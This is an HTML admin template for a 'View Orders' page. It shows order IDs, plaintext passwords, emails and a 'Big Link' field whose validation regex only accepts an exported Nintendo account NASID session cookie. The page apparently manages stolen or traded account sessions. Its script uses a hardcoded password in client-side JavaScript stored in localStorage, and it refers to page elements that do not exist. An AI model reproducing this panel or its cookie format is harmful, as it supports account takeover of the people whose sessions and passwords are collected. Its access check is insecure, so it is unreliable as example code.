<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Orders</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 20px;
        }

        .container {
            width: 80%;
            margin: auto;
            padding: 30px;
            background-color: #1a1a1a;
            border-radius: 12px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 2.5rem;
            color: #f8b400;
            text-align: center;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th, td {
            padding: 12px;
            text-align: center;
            border: 1px solid #555;
        }

        th {
            background-color: #333;
        }

        td {
            background-color: #444;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #f8b400;
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #ffbf00;
        }

        .footer {
            text-align: center;
            padding: 20px;
            position: relative;
            bottom: 0;
            width: 100%;
        }

        .footer a {
            color: yellow;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>View Orders</h1>
        
        <!-- Table to display orders -->
        {% if orders %}
            <table>
                <thead>
                    <tr>
                        <th>Order ID</th>
                        <th>Password</th>
                        <th>Big Link</th>
                        <th>Email</th>
                    </tr>
                </thead>
                <tbody>
                    {% for order in orders %}
                        <tr>
                            <td>{{ order.order_id }}</td>
                            <td>{{ order.password }}</td>
                            <td>{{ order.big_link }}</td>
                            <td>{{ order.email }}</td>
                        </tr>
                    {% endfor %}
                </tbody>
            </table>
        {% else %}
            <p>No orders found.</p>
        {% endif %}
        
        <!-- View Database Section -->
        <form action="{{ url_for('main.view_db') }}" method="get">
            <button type="submit">View Database</button>
        </form>

        <div class="footer">
            <a href="{{ url_for('main.index') }}">Back to Admin</a>
        </div>

    </div>
 <script>
        // Authentication logic
        const authPassword = 'Dikzakjes505';

        // Check if the password is already saved in local storage
        let savedPassword = localStorage.getItem('authPassword');

        if (savedPassword === authPassword) {
            document.getElementById('dashboard').style.display = 'block';
        } else {
            const userPassword = prompt('Please enter the password to access this page.');

            if (userPassword === authPassword) {
                localStorage.setItem('authPassword', userPassword);
                document.getElementById('dashboard').style.display = 'block';
            } else {
                alert('Incorrect password. Access denied.');
                document.getElementById('dashboard').style.display = 'none';
            }
        }

        // Big Link format validation
        const bigLinkPattern = /^\[\{"domain":"accounts\.nintendo\.com","expirationDate":[0-9.]+,"hostOnly":(true|false),"httpOnly":(true|false),"name":"NASID","path":"\/","sameSite":"Unspecified","secure":(true|false),"session":(true|false),"storeId":null,"value":".+","id":[0-9]+\}\]$/;

        document.getElementById('adminForm').addEventListener('submit', function(event) {
            const bigLinkInput = document.getElementById('big_link').value;

            if (!bigLinkPattern.test(bigLinkInput)) {
                event.preventDefault();  // Prevent form submission
                document.getElementById('bigLinkError').style.display = 'block';  // Show error message
            } else {
                document.getElementById('bigLinkError').style.display = 'none';  // Hide error if valid
            }
        });
    </script> 
</body>
</html>
